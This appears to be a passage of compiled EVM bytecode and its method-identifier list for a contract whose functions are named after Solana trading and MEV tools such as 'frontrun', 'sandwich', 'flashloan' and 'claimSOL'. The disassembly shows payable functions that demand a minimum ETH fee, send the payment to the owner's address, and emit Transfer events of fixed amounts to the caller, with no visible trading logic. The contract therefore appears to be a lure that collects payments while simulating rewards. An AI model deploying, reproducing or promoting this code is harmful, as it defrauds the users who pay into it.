0x539 SWAP1 PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0xFF SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x4A2 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x8D5 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x8E5 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x8F5 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x905 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x577 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E1 PUSH2 0x586 CALLDATASIZE PUSH1 0x4 PUSH2 0xD40 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x6 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x915 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x925 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x935 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x945 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x955 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x965 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x975 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x985 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x995 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E1 PUSH2 0x604 CALLDATASIZE PUSH1 0x4 PUSH2 0xD40 JUMP JUMPDEST PUSH2 0x9A5 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA1A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA2A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA3A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA4A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA5A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA6A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA7A JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x64D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH6 0x5AF3107A4000 PUSH2 0x4E1 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xA8A JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x495 PUSH2 0xA9A JUMP JUMPDEST PUSH2 0x476 PUSH2 0xAA7 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x68B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x8 SLOAD PUSH2 0x4E1 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xAB7 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xAC7 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xAD7 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xAE7 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xAF7 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xB07 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xB17 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xB27 JUMP JUMPDEST PUSH2 0x476 PUSH2 0xB37 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP1 SUB PUSH2 0x75C JUMPI PUSH1 0x8 DUP1 SLOAD SWAP1 PUSH1 0x0 PUSH2 0x70B DUP4 PUSH2 0xD70 JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x7 DUP1 SLOAD PUSH1 0x1 DUP2 ADD DUP3 SSTORE PUSH1 0x0 SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0xA66CC928B5EDB82AF9BD49922954155AB7B0942694BEA4CE44661D9A8736C688 ADD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND OR SWAP1 SSTORE JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 TIMESTAMP SWAP1 SSTORE PUSH1 0x6 SWAP1 SWAP2 MSTORE DUP2 KECCAK256 DUP1 SLOAD SWAP2 PUSH2 0x78D DUP4 PUSH2 0xD70 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP POP JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x246139CA8000 PUSH2 0xB43 JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH2 0x7B4 SWAP1 PUSH2 0xD89 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x7E0 SWAP1 PUSH2 0xD89 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x82D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x802 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x82D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x810 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1E0369471000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x12309CE54000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xDA475ABF000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1B48EB57E000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x10D35DEDA800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1FD512913000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x16BCC41E9000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1402462F6000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1476B081E800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x2632E314A000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1977420DC000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x2BA7DEF30000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x11BC3292B800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xA012317B000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xBD2CC61D000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x2D79883D2000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xF01B4A38800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xCBBA106E000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x21A6BBDB5000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x14EB1AD47000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x8A3E4201800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x105EF39B2000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xB5E620F4800 PUSH2 0xB43 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x9BD JUMPI POP PUSH1 0x0 SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP1 DUP4 AND SUB PUSH2 0x9E2 JUMPI POP PUSH8 0x16345785D8A0000 SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD ISZERO PUSH2 0xA0D JUMPI POP PUSH6 0x48C27395000 SWAP2 SWAP1 POP JUMP JUMPDEST POP PUSH6 0x246139CA800 SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x7BB0F7B0800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1319718A5000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x9184E72A000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x6D23AD5F800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xA758D6A3800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x1147C8403000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x15D3EF798000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x3205AF767000 PUSH2 0xB43 JUMP JUMPDEST PUSH1 0x2 DUP1 SLOAD PUSH2 0x7B4 SWAP1 PUSH2 0xD89 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x82F79CD9000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x746A5288000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xAE9F7BCC000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xE18DFFE7800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xFEA89489800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x800E8DFC000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x98CB8C52800 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x28ED6103D000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0xE8D4A510000 PUSH2 0xB43 JUMP JUMPDEST PUSH2 0x7A5 CALLER PUSH6 0x228F90806000 JUMPDEST PUSH6 0x5AF3107A4000 CALLVALUE LT ISZERO PUSH2 0xB99 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x17 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4665653A20302E3030303120455448206D696E696D756D000000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x38E JUMP JUMPDEST PUSH2 0xBA2 DUP3 PUSH2 0x6DC JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 CALLVALUE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xBEF JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xBF4 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0xC37 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x151C985B9CD9995C8819985A5B1959 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x38E JUMP JUMPDEST DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH32 0xE34918FF1C7084970068B53FD71AD6D8B04E9F15D3886CBF006443E6CDC52EA6 DUP4 PUSH1 0x40 MLOAD PUSH2 0xC72 SWAP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH1 0x40 MLOAD DUP3 DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND SWAP1 ADDRESS SWAP1 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP1 PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH2 0xCEC JUMPI PUSH2 0xCEC PUSH2 0xCBF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x20 DUP2 MSTORE PUSH1 0x0 DUP3 MLOAD DUP1 PUSH1 0x20 DUP5 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0xD20 JUMPI PUSH1 0x20 DUP2 DUP7 ADD DUP2 ADD MLOAD PUSH1 0x40 DUP7 DUP5 ADD ADD MSTORE ADD PUSH2 0xD03 JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x40 DUP3 DUP6 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP5 ADD ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xD52 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xD69 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0xD82 JUMPI PUSH2 0xD82 PUSH2 0xCBF JUMP JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0xD9D JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0xDBD JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 BASEFEE 0xFC CALLER 0xB2 DIV MSTORE 0xCC BLOBHASH DUP11 EXTCODESIZE SWAP5 RETURN EXP JUMP PUSH14 0xD3B49C536DF1FEEA8BF8F0EF428A 0xD9 0xC8 0xB2 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER "},"methodIdentifiers":{"arbitrage()":"69c8d338","backrun()":"82a761f0","balanceOf(address)":"70a08231","bome()":"5c69f9da","bonk()":"55905e71","claimSOL()":"7af3b822","copyTrade()":"c58e8276","decimals()":"313ce567","drift()":"d3b33b63","epochRewards()":"773f7a3a","flashloan()":"1b89b61a","frontrun()":"0c60e091","getInteractionCount(address)":"4c5a0aaa","getParticipationFee()":"863fc11e","getTotalParticipants()":"a90cc445","governance()":"5aa6e675","jito()":"117fa591","jup()":"89cf3eeb","jupiterSwap()":"7495b372","kamino()":"6da3c0d5","liquidation()":"f2dfbf66","liquidityMining()":"85b2d535","mango()":"e7c7477a","marinade()":"53767ca4","meteora()":"4947bfda","mev()":"13c9b33a","mew()":"1ac19af7","myro()":"f8854760","name()":"06fdde03","orcaSwap()":"978dc1ea","phoenix()":"b1323779","popcat()":"02fdfcaf","ray()":"416a8b20","raydiumClaim()":"be861440","sanctum()":"823ac842","sandwich()":"1dd13e25","serumTrade()":"8191b45b","slerf()":"22b689d5","snipe()":"39b0ff21","solend()":"6590a477","stakeSOL()":"0f405257","symbol()":"95d89b41","tensor()":"5b1614fc","totalSupply()":"18160ddd","unstakeSOL()":"194ea505","validatorRewards()":"5d1e3616","vesting()":"44c63eec","volume()":"c618a1e4","wen()":"07824c06","wif()":"ef9411cc","yieldFarm()":"1e092efb"}}}}}